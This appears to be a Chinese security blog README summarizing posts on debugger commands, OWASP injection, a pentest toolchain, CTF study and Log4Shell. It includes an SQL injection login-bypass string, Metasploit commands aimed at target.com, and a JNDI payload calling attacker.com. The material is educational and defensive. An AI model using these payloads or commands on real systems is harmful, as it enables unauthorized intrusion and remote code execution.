<div align="center">

# `// BLOG : 信息安全实验室`

`RHODES ISLAND :// SECURITY // RESEARCH // EXPLOIT // DEFENSE`

[![Tag](https://img.shields.io/badge/TAG-漏洞分析-00d4ff?style=flat-square)](#) [![Tag](https://img.shields.io/badge/TAG-安全工具-3366ff?style=flat-square)](#) [![Tag](https://img.shields.io/badge/TAG-学习笔记-ff6b35?style=flat-square)](#) [![Tag](https://img.shields.io/badge/TAG-逆向-7b2d8e?style=flat-square)](#) [![Tag](https://img.shields.io/badge/TAG-调试-2ea44f?style=flat-square)](#) [![Tag](https://img.shields.io/badge/TAG-自定义-add?style=flat-square&color=8888a0)](#)

`> 记录信息安全路上的学习、思考与实战。持续更新中 ...`  
`> LOADING - 100% ..................................................................`

</div>

---

## `// NAV // INDEX`

<table>
<tr>
<td align="center"><b><a href="#">🏠 首页</a></b></td>
<td align="center"><b><a href="#">🔍 漏洞分析</a></b></td>
<td align="center"><b><a href="#">🛠 安全工具</a></b></td>
<td align="center"><b><a href="#">📓 学习笔记</a></b></td>
<td align="center"><b><a href="#">🏷 标签归档</a></b></td>
<td align="center"><b><a href="#">📬 关于</a></b></td>
</tr>
</table>

---

## `// LATEST // POSTS`

<br>

### `2026 // 05 / 30` <a href="#">**Windows 逆向调试工具速查手册**</a>

`TAGS:` [![](https://img.shields.io/badge/逆向-7b2d8e?style=flat-square)](#) [![](https://img.shields.io/badge/调试-2ea44f?style=flat-square)](#) [![](https://img.shields.io/badge/X64dbg-00d4ff?style=flat-square)](#) [![](https://img.shields.io/badge/Windbg-3366ff?style=flat-square)](#)

> 一份全面系统的 Windows 逆向工程与调试工具速查手册，涵盖 **X64dbg**、**Windbg**、**OllyDbg (Onlydbg)** 三大调试器的核心快捷键、断点类型、内存操作、寄存器查看、模块管理、异常处理等关键命令与技巧。适合逆向初学者和日常开发调试查阅。

<details>
<summary><code>READ MORE // 展开阅读全文</code></summary>

#### 内容概览

| 章节 | 内容 |
|------|------|
| **X64dbg 篇** | 快捷键大全、断点管理（F2/F9/F7/F8）、寄存器与内存窗口、调试执行控制 |
| **Windbg 篇** | 进程控制、内存读写（db/dw/dd/dq/eb/ew/ed/eq）、搜索命令（s -b/-d/-a）、断点（ba/bp/bu/bm）、栈回溯（k/kb/kv/kp）、线程与模块管理、符号配置 |
| **OllyDbg 篇** | 全部快捷键映射（F2-F12/Ctrl+F2-F12/Alt+组合键）、断点类型（BP/BPX/BPD/BC/MR/MW/MD/HR/HW/HE/HD）、内存转储（DUMP/DA/DB/DC/DD/DU/DW）、表达式与监视 |

> 📎 **完整文档**: [`assets/逆向调试笔记.docx`](assets/逆向调试笔记.docx) — 本地可下载查阅

</details>

---

### `2026 // 05 / 28` <a href="#">**OWASP Top 10 深度解读：注入攻击 (Injection)**</a>

`TAGS:` [![](https://img.shields.io/badge/漏洞分析-00d4ff?style=flat-square)](#) [![](https://img.shields.io/badge/OWASP-3366ff?style=flat-square)](#) [![](https://img.shields.io/badge/Web安全-ff6b35?style=flat-square)](#)

> 注入攻击连续多年位居 OWASP Top 10 榜首。无论是 SQL 注入、NoSQL 注入还是 OS 命令注入，
> 其本质都是**用户输入被解释器当作代码执行**。本文将深入分析注入攻击的原理、变种及防御方案。

<details>
<summary><code>READ MORE // 展开阅读全文</code></summary>

#### 攻击原理

当应用程序将不可信的数据作为命令或查询的一部分发送给解释器时，注入漏洞便会产生。攻击者可以构造恶意输入，改变查询的语义。

```sql
-- 典型的 SQL 注入示例
SELECT * FROM users WHERE username = 'admin' AND password = '...';
-- 攻击者输入: admin' OR '1'='1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...';
```

#### 常见注入类型

| 类型 | 目标解释器 | 典型场景 |
|------|-----------|---------|
| SQL 注入 | 关系型数据库 | 登录绕过、拖库 |
| NoSQL 注入 | MongoDB 等 | JSON 查询注入 |
| OS 命令注入 | Shell | Ping 工具、文件处理 |
| LDAP 注入 | LDAP 目录服务 | 认证绕过 |
| XPath 注入 | XML 解析器 | XML 数据窃取 |

#### 防御方案

1. **参数化查询 (Prepared Statement)** — 最有效的防御手段
2. **输入验证 (Input Validation)** — 白名单优于黑名单
3. **最小权限原则** — 数据库账号不应使用 DBA 权限
4. **输出编码 (Output Encoding)** — 防御二次注入

```python
# 安全的参数化查询示例 (Python + SQLite)
import sqlite3

conn = sqlite3.connect('users.db')
cursor = conn.cursor()

# ❌ 不安全: 字符串拼接
cursor.execute(f"SELECT * FROM users WHERE name = '{user_input}'")

# ✅ 安全: 参数化查询
cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))
```

> **参考**: OWASP Injection | CWE-77 | CWE-89

</details>

---

### `2026 // 05 / 25` <a href="#">**渗透测试工具链：从信息收集到权限维持**</a>

`TAGS:` [![](https://img.shields.io/badge/安全工具-00d4ff?style=flat-square)](#) [![](https://img.shields.io/badge/渗透测试-3366ff?style=flat-square)](#) [![](https://img.shields.io/badge/KaliLinux-ff6b35?style=flat-square)](#)

> 一次完整的渗透测试通常遵循 **PTES (Penetration Testing Execution Standard)** 标准流程。
> 本文整理各阶段的核心工具及使用技巧。

<details>
<summary><code>READ MORE // 展开阅读全文</code></summary>

#### 1. 信息收集 (Reconnaissance)

| 工具 | 用途 | 命令示例 |
|------|------|---------|
| **Nmap** | 端口扫描/服务探测 | `nmap -sV -sC -p- target.com` |
| **dirsearch** | 目录爆破 | `dirsearch -u https://target.com -e php` |
| **Sublist3r** | 子域名枚举 | `sublist3r -d target.com` |
| **theHarvester** | 邮箱/域名收集 | `theHarvester -d target.com -b google` |

#### 2. 漏洞扫描 (Vulnerability Scanning)

```bash
# Nuclei — 基于模板的快速漏洞扫描
nuclei -u https://target.com -t cves/ -severity critical,high

# Nikto — Web 服务器扫描器
nikto -h https://target.com -ssl
```

#### 3. 漏洞利用 (Exploitation)

```bash
# Metasploit 框架使用示例
msfconsole -q
msf6 > search tomcat
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 > set RHOSTS target.com
msf6 > run
```

#### 4. 权限维持 (Post-Exploitation)

- **Meterpreter**: `persistence` 模块创建后门服务
- **CrackMapExec**: 内网横向移动利器
- **BloodHound**: AD 攻击路径可视化分析

> 💡 **原则**: 渗透测试应在获得授权后进行，遵守法律法规及行业规范。

</details>

---

### `2026 // 05 / 20` <a href="#">**CTF 学习笔记：Web 安全入门实战**</a>

`TAGS:` [![](https://img.shields.io/badge/学习笔记-00d4ff?style=flat-square)](#) [![](https://img.shields.io/badge/CTF-3366ff?style=flat-square)](#) [![](https://img.shields.io/badge/Web安全-ff6b35?style=flat-square)](#)

> CTF (Capture The Flag) 是信息安全学习者最好的练兵场。本文梳理 Web 方向的核心题型与解题思路。

<details>
<summary><code>READ MORE // 展开阅读全文</code></summary>

#### Web 常见题型速查表

| 题型 | 核心考点 | 难度 |
|------|---------|------|
| **SQL 注入** | 参数化查询绕过、报错注入、布尔盲注 | ⭐⭐ |
| **XSS** | 反射型/存储型/DOM 型、CSP 绕过 | ⭐⭐ |
| **SSRF** | 服务端请求伪造、内网探测 | ⭐⭐⭐ |
| **文件上传** | 后缀绕过、.htaccess、PHAR 反序列化 | ⭐⭐⭐ |
| **RCE** | 命令注入、模板注入 (SSTI) | ⭐⭐⭐⭐ |
| **JWT 攻击** | 算法混淆、空签名、密钥爆破 | ⭐⭐ |
| **反序列化** | PHP/Python/Java 反序列化利用链 | ⭐⭐⭐⭐⭐ |

#### 新手推荐学习路线

```
基础阶段
├── HTTP 协议基础 (请求/响应/状态码/Header)
├── 前端安全基础 (同源策略/CORS/Cookie)
├── 专业术语库 (Payload/POC/EXP/SHELL)
└── 实验室环境搭建 (DVWA/Pikachu/SQLi-Labs)

进阶阶段
├── OWASP Top 10 逐个攻破
├── 阅读 CVE 漏洞公告
├── 参加线上 CTF (BugKu / CTFHub / HackTheBox)
└── 复现经典漏洞 (ThinkPHP/Shiro/Log4j)

实战阶段
├── 挖 SRC 漏洞 (补天 / 漏洞盒子 / HackerOne)
├── 撰写漏洞分析文章
└── 参与护网/攻防演练
```

#### 常用工具速查

| 工具 | 场景 |
|------|------|
| **Burp Suite** | HTTP 拦截/重放/爆破 (Web 安全必备) |
| **HackBar** (Burp 插件) | 快速编解码/SQL 注入辅助 |
| **CyberChef** | 万能编解码/加解密工具 |
| **sqlmap** | SQL 注入自动化检测与利用 |

> 📌 **推荐 CTF 平台**: [CTFHub](https://www.ctfhub.com/) · [BugKu](https://ctf.bugku.com/) · [Buuctf](https://buuoj.cn/) · [HackTheBox](https://www.hackthebox.com/) · [PicoCTF](https://picoctf.com/)

</details>

---

### `2026 // 05 / 15` <a href="#">**从 Log4j 漏洞看供应链安全**</a>

`TAGS:` [![](https://img.shields.io/badge/漏洞分析-00d4ff?style=flat-square)](#) [![](https://img.shields.io/badge/供应链安全-3366ff?style=flat-square)](#) [![](https://img.shields.io/badge/CVE-ff6b35?style=flat-square)](#)

> CVE-2021-44228 (Log4Shell) 是近年来影响最广泛的漏洞之一。一个几乎无处不在的日志库，一个 JNDI 注入，
> 导致了整个互联网的"大地震"。

<details>
<summary><code>READ MORE // 展开阅读全文</code></summary>

#### 漏洞时间线

| 时间 | 事件 |
|------|------|
| 2021-11-24 | 陈师傅在阿里云安全团队发现漏洞并提交 |
| 2021-12-09 | 漏洞细节公开，引发全球应急响应 |
| 2021-12-10 | CVSS 评分 10.0 (最高严重等级) |
| 2021-12-14 | Apache 发布 Log4j 2.15.0 修复版 |
| 至今 | 持续出现绕过补丁的变种 (2.16.0 → 2.17.0) |

#### 漏洞原理

```
${jndi:ldap://attacker.com/exploit}
  ↑                           ↑
JNDI 查询                 恶意 LDAP 服务器
   → 返回恶意 Java 类
   → 目标服务器执行
   → 攻击者获得 RCE
```

#### 防御措施

1. **升级 Log4j 至 2.17.0+**
2. 设置 JVM 参数: `-Dlog4j2.formatMsgNoLookups=true`
3. 使用 WAF 规则拦截 JNDI 注入 Payload
4. 建立 SBOM (软件物料清单) 管理供应链风险

> 📖 这个漏洞教会我们：**任何一个开源组件都可能成为整个系统的短板**。

</details>

---

## `// TAGS // INDEX`

| 标签 | 文章数 |
|------|-------|
| <a href="#">`#漏洞分析`</a> | 2 |
| <a href="#">`#安全工具`</a> | 1 |
| <a href="#">`#学习笔记`</a> | 1 |
| <a href="#">`#OWASP`</a> | 1 |
| <a href="#">`#CTF`</a> | 1 |
| <a href="#">`#Web安全`</a> | 2 |
| <a href="#">`#渗透测试`</a> | 1 |
| <a href="#">`#供应链安全`</a> | 1 |
| <a href="#">`#CVE`</a> | 1 |
| <a href="#">`#KaliLinux`</a> | 1 |
| <a href="#">`#逆向`</a> | 1 |
| <a href="#">`#调试`</a> | 1 |
| <a href="#">`#X64dbg`</a> | 1 |
| <a href="#">`#Windbg`</a> | 1 |
| <a href="#">`#自定义标签`</a> | — 待添加 |

---

### `// TEMPLATE // 如何添加新文章`

在 `readme.md` 中复制以下模板并粘贴到文章列表区域：

```markdown
### `YYYY / MM / DD` <a href="#">**文章标题**</a>

`TAGS:` [![](https://img.shields.io/badge/你的标签-00d4ff?style=flat-square)](#)

> 文章摘要 ...

<details>
<summary><code>READ MORE // 展开阅读全文</code></summary>

这里是正文内容 ...

</details>

---
```

> 如需添加新标签，在 `TAGS:` 行和 `TAGS INDEX` 表格中同时添加即可。

---

<div align="center">

---

`RHODES ISLAND :// SECURITY LAB // BLOG // REV 2.0.1`

`> 保持好奇 · 保持怀疑 · 保持学习`

`CONNECT // [GitHub](https://github.com) · [Blog](https://example.com) · [Email](mailto:user@example.com)`

`LOADING - 100% ..................................................................`

`(c) 2026 // SECURITY BLOG // ALL RIGHTS RESERVED`

</div>
